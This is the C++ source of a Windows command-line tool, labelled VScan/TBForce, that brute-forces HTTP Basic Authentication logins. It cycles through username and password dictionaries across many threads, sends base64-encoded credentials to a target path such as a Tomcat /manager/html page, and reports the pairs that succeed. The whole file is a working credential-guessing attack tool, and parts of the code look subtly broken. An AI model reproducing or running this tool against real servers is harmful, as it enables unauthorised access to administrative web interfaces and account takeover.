//	VScan	v1.20
//	2013-03-25
//	2013-05-06
//	2013-06-05
//	2013-06-12
#include <stdio.h>  
#include <WinSock2.h>
#include <Windows.h>
#include <process.h>
#include <string>
#include <iostream>
#include "h_base.h"
#include "Base64.h"
#include "cList.h"
#pragma comment(lib,"ws2_32.lib")
using namespace std;

#define RECV_STATUS_SIZE 16
#define RECV_BUF_SIZE 1024
#define TIMEOUT 4096
#define SLEEP_TIME 8
#define PSTATUE 64
#define Method_GET "GET %s HTTP/1.0\r\nHost:%s\r\nAccept:*/*\r\nAuthorization: Basic %s\r\n\r\n"

char WEB_IP[18]="127.0.0.1";
int  WEB_PORT=80;
char WEBSITE[64]="127.0.0.1";
char WEBPATH[256]="/";

long iThreadCount = 0;	// 创建的线程数目计数
bool EXIT_FLAG = false;		// 退出标志（按下了CTRL+C），文件是否已经读取完毕 
long fileline=0, badcount = 0, rcount = 0;	// 读取的行数，Socket错误次数，成功探测到的路径数

CRITICAL_SECTION beswap;	// 临界区
Node *nameList;		// 用户名list
FILE *fpPass;		// 密码文件指针

// 使用帮助
//
void usage(char *argv0){
	printf("\r\n TBForce 1.00 usage:\n\t%s +[URI+Port+Path] +[Name.txt] +[Pass.txt] -[Threads]",argv0);
	printf("\r\n\t%s http://www.ayiis.me/manager/html name.txt pass.txt",argv0);
	printf("\r\n\t%s http://www.ayiis.me:8080/manager/html name.txt pass.txt 16\r\n",argv0);
}

// 退出事件的监听函数
//
BOOL WINAPI ConsoleHandler(DWORD msgType)
{
    if (msgType == CTRL_C_EVENT){
		EXIT_FLAG=true;
		return TRUE;
	}
    else if (msgType == CTRL_CLOSE_EVENT){
		EXIT_FLAG=true;
		return TRUE;
	}
    return FALSE;
}

// 读入用户名字典
//
bool readInList(char *fileName)
{
	FILE *fpFile;
	nameList = InitLink();

	char tmp[256]={0};

	if((fpFile=fopen(fileName,"r"))==NULL){
		printf("\r\n***Error: %s can not be read.\r\n",fileName);
		return false;
	}
	while(fgets(tmp,256,fpFile)){
		if(tmp[strlen(tmp)-1]=='\n'){
			tmp[strlen(tmp)-1]='\0';	// 去除行尾的换行符
		}
		Insert(nameList,tmp);
	}
	return true;
}


// 侦测本程序对目标是否有效
//
bool Detect(char *ip,int port){
	struct sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(port);
	sin.sin_addr.S_un.S_addr = inet_addr(ip);
	SOCKET sClient = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);

	if(connect(sClient,(sockaddr*)&sin,sizeof(sin))==SOCKET_ERROR){
		printf("\n***Target can not be reached i guess.Check the uri or port.\n");
		return false;
	}

	char buf[RECV_BUF_SIZE]={0};
	sprintf( buf,  Method_GET  , WEBPATH, WEBSITE );
	send( sClient, buf, strlen(buf), 0 );
	char rec[RECV_BUF_SIZE]={0};
	int len = 0;
	if( (len = recv(sClient,rec,RECV_BUF_SIZE,0)) == SOCKET_ERROR){
		printf( "\n**Warning: The target is reachable."
			"\n\tBut somehow i can't detect the response messages from the website."
			"\n\tHowever, the following scanning will not been canceled.Let me try it.\n");
		return true;
	}
	closesocket(sClient);
	len = strstr(rec,"\r\n\r\n") - rec;
	for(int i=0;i<len && i<RECV_BUF_SIZE;i++)
		buf[i] = rec[i];

	buf[len]='\n';	buf[len+1]='\0';	rec[12]='\0';

	int sCode=a2i(rec+9);
	
	if( sCode != 401 ){
		printf("***Sorry, got an invalid Status Code: %d\n",sCode);
		return false;
	}
	else{
		printf("%s*GOT STATUS CODE: %d\n",buf,sCode);
	}
	return true;
}

// 线程函数，作了大量优化
//
unsigned _stdcall seeIt(void*){

	char buf[RECV_BUF_SIZE]={0},rec[RECV_STATUS_SIZE]={0};
	char tmp[MAX_PATH]={0};
	char tmp2[Max_PATH]={0};
	char base64String[1024]={0} ;
	char burpingKey[1024] = {0};

	struct sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(WEB_PORT);	// 全局的端口
	sin.sin_addr.S_un.S_addr = inet_addr(WEB_IP);	// 全局的IP

	while( nameList != NULL && EXIT_FLAG==false){

//------------------------------进入第一临界区--------------------------------
//
		EnterCriticalSection(&beswap);

		if( !fgets(tmp,MAX_PATH,fpPass) ){
			nameList = nameList->pNext;	// list里的下一个用户名
			if(nameList == NULL) break;	// 如果用户名list已循环尽
			fseek(fpPass,0,0);
			fgets(tmp,MAX_PATH,fpPass);
		}
		if(tmp[strlen(tmp)-1]=='\n'){
			tmp[strlen(tmp)-1]='\0';	// 去除行尾的换行符
		}
		++fileline;
		sprintf(burpingKey,"%s:%s", nameList->data, tmp);
		if( fileline%PSTATUE==0 && strlen(burpingKey)<30 )	printf("%-76s%c",burpingKey,13);	// 输出进度

		LeaveCriticalSection(&beswap);
//
//------------------------------退出第一临界区--------------------------------

		SOCKET sClient = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);

		if(connect(sClient,(sockaddr*)&sin,sizeof(sin))==SOCKET_ERROR){
			closesocket(sClient);
			Sleep(SLEEP_TIME*8);
			continue;
		}

		Base64_Encode(base64String,burpingKey,strlen(burpingKey));		// base64 字符串
		sprintf( buf, Method_GET, WEBPATH, WEBSITE, base64String);		// 拼接URL请求

		send( sClient,buf,strlen(buf),0 );
		if(recv(sClient,rec,RECV_STATUS_SIZE,0) == SOCKET_ERROR){	// 只需要接收到状态字就可以了
			InterlockedIncrement(&badcount);	// 统计socket的失败次数
			closesocket(sClient);
			Sleep(SLEEP_TIME*8);
			printf("\r\n is Error:%s",burpingKey);
			continue;
		}
		rec[12]='\0';
		closesocket(sClient);

		int sCode=a2i(rec+9);
		if ( sCode != -1 && sCode != 401 ){		// 如果状态字不是 401
			InterlockedIncrement(&rcount);
			printf("%-28s \t{%d}\n",burpingKey,sCode);	// 输出结果
		}
	}
	InterlockedDecrement(&iThreadCount);
	return 0;
}

// 主函数
//
int main(int argc,char **argv){
	int Max_THREAD = 16;	// 定义最大线程数量

	// 监听[CTRL+C]等事件
	SetConsoleCtrlHandler( (PHANDLER_ROUTINE) ConsoleHandler, TRUE);

	// 检查参数是否合法
	if( argc < 2 || argc > 5 ){
		usage(argv[0]);
		return -1;
	}

	// 提取 域名 路径 端口
	if(urlFormatF(argv[1],WEBSITE,WEBPATH,&WEB_PORT)==false){
		printf("\n***Unrecognizable URI format\n");
		usage(argv[0]);
		return -1;
	}

	if( 5<=argc ){		// 设置最大线程数
		if( a2i(argv[4]) != -1 )
			Max_THREAD = a2i(argv[4]);
		else
			printf("**Warning: Got an illegal input in Threads Parameter.\n\t   Reset Threads to 16.\n");
	}

	// 初始化socket
	WSADATA wsa;
	WSAStartup(MAKEWORD(2,2),&wsa);

	// 获得域名的解析IP
	strcpy(WEB_IP,www2ip(WEBSITE));
	SYSTEMTIME sys;
	GetLocalTime( &sys );
	double start=((sys.wHour*60+sys.wMinute)*60+sys.wSecond)*1000+sys.wMilliseconds;
	char outBuf[RECV_BUF_SIZE]={0};

	sprintf(outBuf,"\n*Resolved IP Address: %s\n",WEB_IP);
	printf(outBuf);

	// 在线程开始之前先进行探测，如果返回错误则说明本程序不适合目标
	if( !Detect( WEB_IP , WEB_PORT ) ){
		printf("***Error code: %d\n",GetLastError());
		return -1;
	}
	
	// 打开字典文件，放在这里是为了即使不存在字典也可以先进行上一步侦测返回信息
	if(argc < 4)	return -1;
	if( readInList(argv[2])==false || (fpPass=fopen(argv[3],"r"))==NULL ){
		printf("\n***ERROR: Dic file open error\n");
		return -1;
	}

	// 根据最大线程数创建线程
	HANDLE *hThreads = new HANDLE[Max_THREAD];
	ZeroMemory(hThreads,sizeof(HANDLE)*Max_THREAD);
	nameList = nameList->pNext;		// 因为这个list只有指针，没有数据，所以跳过

//---------------------------------------进入线程同步的临界区----------------------------------
//
	InitializeCriticalSection(&beswap);
//
//  ------

	printf("\n-------------Trying-----------\n");

	// 申请挂起的线程,数量为Max_THREAD
	for( iThreadCount = 0; iThreadCount < Max_THREAD ; iThreadCount++){
		HANDLE hThread = (HANDLE)_beginthreadex(NULL, 0, seeIt, NULL, CREATE_SUSPENDED, NULL);
		if(hThread==NULL){
			printf("***Create thread fail.\n");
			EXIT_FLAG =true;
			break;
		}
		hThreads[iThreadCount] = hThread;		// 统计线程数
		Sleep(SLEEP_TIME);
	}

	// 恢复挂起的线程，数量为iThreadCount
	for(int iReCount=0;iReCount<iThreadCount;iReCount++){
		ResumeThread(hThreads[iReCount]);		// 恢复挂起的线程
		Sleep(SLEEP_TIME*2);
	}

	while( EXIT_FLAG==false && nameList!=NULL )	Sleep(SLEEP_TIME*64);	// 进入循环等待，直到手动停止[CTRL+C]或者跑完

	// 循环等待所有未完成的线程退出
	for(int iGroup = 0 ; 0<iThreadCount ; iGroup ++, iThreadCount -= MAXIMUM_WAIT_OBJECTS )
	{
		WaitForMultipleObjects(
			iThreadCount>MAXIMUM_WAIT_OBJECTS ? MAXIMUM_WAIT_OBJECTS : iThreadCount,
			hThreads+iGroup*MAXIMUM_WAIT_OBJECTS,
			TRUE,			// FALSE will be faster, but TRUE is safer
			TIMEOUT);		// TIMEOUT
		Sleep(SLEEP_TIME);
	}

	fclose(fpPass);
	delete[Max_THREAD] hThreads;	// 清理
	WSACleanup();

//  ------
//
	DeleteCriticalSection(&beswap);
//
//---------------------------------------退出线程同步的临界区----------------------------------

	GetLocalTime( &sys );
	double duration = (((sys.wHour*60+sys.wMinute)*60+sys.wSecond)*1000+sys.wMilliseconds - start)/1000;

	sprintf(outBuf,"-------------Done!------------\n");
	sprintf(outBuf,"%s\n*BruteForce %s:",outBuf,WEBSITE);
	sprintf(outBuf,"%s\n\tRequset = %d, BadRequest = %d",outBuf,fileline,badcount);
	sprintf(outBuf,"%s\n\tTime = %.3fs, Speed = %.1f L/s",outBuf,duration,(double)fileline/duration);
	sprintf(outBuf,"%s\n\tDetected User = %d\n",outBuf,rcount);

	printf(outBuf);
	exit(0);
}
